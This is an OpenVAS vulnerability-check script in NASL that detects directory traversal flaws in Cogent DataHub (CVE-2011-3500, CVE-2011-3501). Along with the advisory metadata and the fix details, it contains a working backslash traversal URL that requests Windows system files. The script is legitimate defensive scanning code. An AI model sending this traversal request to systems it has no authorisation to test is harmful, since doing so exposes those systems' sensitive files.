###############################################################################
# OpenVAS Vulnerability Test
#
# Cogent DataHub Directory Traversal Vulnerability and Information Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103253");
  script_version("2020-08-24T15:18:35+0000");
  script_bugtraq_id(49610, 49611);
  script_cve_id("CVE-2011-3500", "CVE-2011-3501");
  script_tag(name:"last_modification", value:"2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2011-09-14 13:31:57 +0200 (Wed, 14 Sep 2011)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("Cogent DataHub Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "httpver.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_mandatory_keys("Host/runs_windows");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49610");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49611");
  script_xref(name:"URL", value:"http://aluigi.org/mytoolz/mydown.zip");

  script_tag(name:"summary", value:"Cogent DataHub is prone to a directory-traversal vulnerability, an
  information-disclosure vulnerability and to multiple buffer-overflow
  and integer-overflow vulnerabilities.");

  script_tag(name:"impact", value:"Exploiting the issues may allow an attacker to obtain sensitive
  information that could aid in further attacks or may allow attackers
  to execute arbitrary code within the context of the privileged domain.");

  script_tag(name:"affected", value:"Cogent DataHub 7.1.1.63 is vulnerable. Other versions may also
  be affected.");

  script_tag(name:"solution", value:"Update to versions 6.4.20/7.1.2 or later");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");
include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port( default:80 );

files = traversal_files( "windows" );
foreach file( keys( files ) ) {

  url = "/..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\" + files[file];

  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
